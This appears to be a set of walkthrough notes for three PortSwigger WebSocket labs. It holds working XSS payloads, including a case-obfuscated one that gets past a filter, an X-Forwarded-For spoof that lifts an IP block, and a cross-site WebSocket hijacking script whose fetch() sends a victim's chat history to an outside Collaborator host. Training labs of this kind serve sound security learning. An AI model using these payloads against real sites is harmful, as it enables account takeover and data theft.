---
created: 2026-05-17
---
| `#`  | Solved? | Name                                                            | Date    | Notes         |
| ---- | ------- | --------------------------------------------------------------- | ------- | ------------- |
| `1.` | `✓`     | Manipulating WebSocket messages to exploit vulnerabilities      | `17.05` |               |
| `2.` | `✓`     | Cross-site WebSocket hijacking                                  | `01.06` | #Collaborator |
| `3.` | `✓`     | Manipulating the WebSocket handshake to exploit vulnerabilities | `31.05` |               |



## 1. Manipulating WebSocket messages to exploit vulnerabilities

>[!done]

>[!note]+ Lab description
> - [`Lab: Manipulating WebSocket messages to exploit vulnerabilities`](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
> - Level: #Apprentice 
> 
> This online shop has a live chat feature implemented using WebSockets.
> 
> Chat messages that you submit are viewed by a support agent in real time.
> 
> To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

### Solution

- Navigate to `Live chat` and send a test message. Intercept the traffic in Burp:

![[images/walkthrough/PortSwigger/WebSockets/lab1/1.png]]

- Observe the content of the message is reflected in application response. 
- On the chat page, find the `chat.js` script and inspect it:

![[images/walkthrough/PortSwigger/WebSockets/lab1/2.png]]


>[!note]- Script
> ```js
> (function () {
>     var chatForm = document.getElementById("chatForm");
>     var messageBox = document.getElementById("message-box");
>     var webSocket = openWebSocket();
> 
>     messageBox.addEventListener("keydown", function (e) {
>         if (e.key === "Enter" && !e.shiftKey) {
>             e.preventDefault();
>             sendMessage(new FormData(chatForm));
>             chatForm.reset();
>         }
>     });
> 
>     chatForm.addEventListener("submit", function (e) {
>         e.preventDefault();
>         sendMessage(new FormData(this));
>         this.reset();
>     });
> 
>     function writeMessage(className, user, content) {
>         var row = document.createElement("tr");
>         row.className = className
> 
>         var userCell = document.createElement("th");
>         var contentCell = document.createElement("td");
>         userCell.innerHTML = user;
>         contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;
> 
>         row.appendChild(userCell);
>         row.appendChild(contentCell);
>         document.getElementById("chat-area").appendChild(row);
>     }
> 
>     function sendMessage(data) {
>         var object = {};
>         data.forEach(function (value, key) {
>             object[key] = htmlEncode(value);
>         });
> 
>         openWebSocket().then(ws => ws.send(JSON.stringify(object)));
>     }
> 
>     function htmlEncode(str) {
>         if (chatForm.getAttribute("encode")) {
>             return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
>                 var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
>                 return lookup[c];
>             });
>         }
>         return str;
>     }
> 
>     function openWebSocket() {
>        return new Promise(res => {
>             if (webSocket) {
>                 res(webSocket);
>                 return;
>             }
> 
>             let newWebSocket = new WebSocket(chatForm.getAttribute("action"));
> 
>             newWebSocket.onopen = function (evt) {
>                 writeMessage("system", "System:", "No chat history on record");
>                 newWebSocket.send("READY");
>                 res(newWebSocket);
>             }
> 
>             newWebSocket.onmessage = function (evt) {
>                 var message = evt.data;
> 
>                 if (message === "TYPING") {
>                     writeMessage("typing", "", "[typing...]")
>                 } else {
>                     var messageJson = JSON.parse(message);
>                     if (messageJson && messageJson['user'] !== "CONNECTED") {
>                         Array.from(document.getElementsByClassName("system")).forEach(function (element) {
>                             element.parentNode.removeChild(element);
>                         });
>                     }
>                     Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
>                         element.parentNode.removeChild(element);
>                     });
> 
>                     if (messageJson['user'] && messageJson['content']) {
>                         writeMessage("message", messageJson['user'] + ":", messageJson['content'])
>                     } else if (messageJson['error']) {
>                         writeMessage('message', "Error:", messageJson['error']);
>                     }
>                 }
>             };
> 
>             newWebSocket.onclose = function (evt) {
>                 webSocket = undefined;
>                 writeMessage("message", "System:", "--- Disconnected ---");
>             };
>         });
>     }
> })();
> ```
> 

- The code is vulnerable to DOM-based XSS. 
- To exploit, intercept a WebSocket message and replace its content with:


```json
{
  "message": "<img src=x onerror=alert(document.domain)>"
}
```

![[images/walkthrough/PortSwigger/WebSockets/lab1/3.png]]

![[images/walkthrough/PortSwigger/WebSockets/lab1/4.png]]

![[images/walkthrough/PortSwigger/WebSockets/lab1/solved.png]]

Solved!

## 2. Cross-site WebSocket hijacking

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> - [`Lab: Cross-site WebSocket hijacking`](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
> - Level: #Practitioner 
> 
> This online shop has a live chat feature implemented using WebSockets.
> 
> To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

### Solution

- Access `Live chat` and send some messages. Record the traffic. 
- Create some WebSockets history. Then clear both HTTP and WebSockets history, navigate away from the chat, and navigate again. 
- See the application immediately switches to WebSockets and retrieves all previous messages:

![[images/walkthrough/PortSwigger/WebSockets/lab2/1.png]]

- So, to retrieve the victim's messages, you need to initiate a WebSockets connection at `/chat` to the target server in the context of an authenticated victim's session. In other words, you need CSWSH (Cross-Site WebSocket Hijacking).
---

- Go to exploit server and create an exploit:

```html
<script>
    var ws = new WebSocket('wss://0ac10078041be1a28334ca7600840059.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://rc7a1zzgx463phw1e1x5klc8lzrqfg35.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- `Store` and `View exploit`. In Collaborator, see your chat history as requests arrive:

![[images/walkthrough/PortSwigger/WebSockets/lab2/3.png]]

- Change the Collaborator tab, re-generate the domain, `Store` and `Send exploit to victim`. Then `Poll now` in Collaborator and see the messages. 
- Find `carlos`'s password in one of the messages:

![[images/walkthrough/PortSwigger/WebSockets/lab2/4.png]]

- Log in as `carlos`.


![[images/walkthrough/PortSwigger/WebSockets/lab2/solved.png]]


Solved!


## 3. Manipulating the WebSocket handshake to exploit vulnerabilities

>[!done]

>[!note]+ Lab description
>- [`Lab: Manipulating the WebSocket handshake to exploit vulnerabilities`](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
> - Level: #Practitioner 
> 
> This online shop has a live chat feature implemented using WebSockets.
> 
> It has an aggressive but flawed XSS filter.
> 
> To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

### Solution

- Navigate to `Live chat` and send a test message. Intercept the traffic in Burp. Here is how the WebSocket connection upgrade request looks like:

![[images/walkthrough/PortSwigger/WebSockets/lab3/1.png]]

- If you attempt to send a JavaScript payload, such as `<img src=1 onerror='alert(1)'>`, the application disconnects you:

![[images/walkthrough/PortSwigger/WebSockets/lab3/2.png]]

- In Burp history, see your IP address is blocked:

![[images/walkthrough/PortSwigger/WebSockets/lab3/3.png]]


- Send this request to `Repeater` and add `X-Forwarded-For` header trying to spoof your IP address:

![[images/walkthrough/PortSwigger/WebSockets/lab3/4.png]]

- The application doesn't block you anymore. 
- Send one of your WebSocket messages to `Repeater`:

![[images/walkthrough/PortSwigger/WebSockets/lab3/5.png]]
- Click `Reconnect`:

![[images/walkthrough/PortSwigger/WebSockets/lab3/6.png]]

- Add the `X-Forwarded-For` header with a spoofed IP address, then click `Connect`:

![[images/walkthrough/PortSwigger/WebSockets/lab3/7.png]]

- See you are successfully reconnected. 
- Send a WebSocket message containing an obfuscated XSS payload:

```html
<img src=1 oNeRrOr=alert`1`>
```

![[images/walkthrough/PortSwigger/WebSockets/lab3/8.png]]

- You can automatically spoof the header by changing Burp proxy settings:

![[images/walkthrough/PortSwigger/WebSockets/lab3/10.png]]

![[images/walkthrough/PortSwigger/WebSockets/lab3/9.png]]



![[images/walkthrough/PortSwigger/WebSockets/lab3/solved.png]]

Solved!
